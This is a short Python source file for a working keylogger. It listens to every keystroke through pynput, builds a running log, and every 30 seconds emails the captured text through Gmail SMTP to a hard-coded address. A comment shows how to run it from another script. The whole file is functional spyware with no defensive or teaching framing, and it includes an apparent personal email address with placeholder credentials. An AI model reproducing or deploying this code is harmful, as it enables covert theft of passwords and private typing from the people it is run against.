import pynput, threading, smtplib, sys
from datetime import datetime


class Logger:
    
    
    def __init__(self,sendInterval,email,passwd):

        self.timer = sendInterval
        self.log = 'keylogger capture:\n' + str(datetime.now()) + '\n'
        self.email = email
        self.passwd = passwd
    
    
    def appendLog(self,string):
        self.log = self.log + string
    
    
    def processKey(self,key):
        try:
            currentKey = str(key.char)
        except AttributeError:
            if key == key.space:
                currentKey = ' '
            else:
                currentKey = (' ' + str(key) + ' ')
        self.appendLog(currentKey)

    
    def sendMail(self,email,password,message):
        server = smtplib.SMTP('smtp.gmail.com',587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()
    
    
    def report(self):
        self.sendMail(self.email, self.passwd, "\n\n" + self.log)
        self.log = 'keylogger capture:\n' + str(datetime.now()) + '\n'
        timer = threading.Timer(self.timer,self.report)
        timer.start()
    
    
    def start(self):
        keyboard = pynput.keyboard.Listener(on_press=self.processKey)
        with keyboard:
            self.report()
            keyboard.join()
#can also: 
#import keyLog
#logger = keyLog.Logger(120,'benpro4433@gmail.com','APPPASS') on another script

logger = Logger(30,'benpro4433@gmail.com','apppass')
try:
    logger.start()
except KeyboardInterrupt:
    print('\nInterrupt caught, quitting...')
    sys.exit()
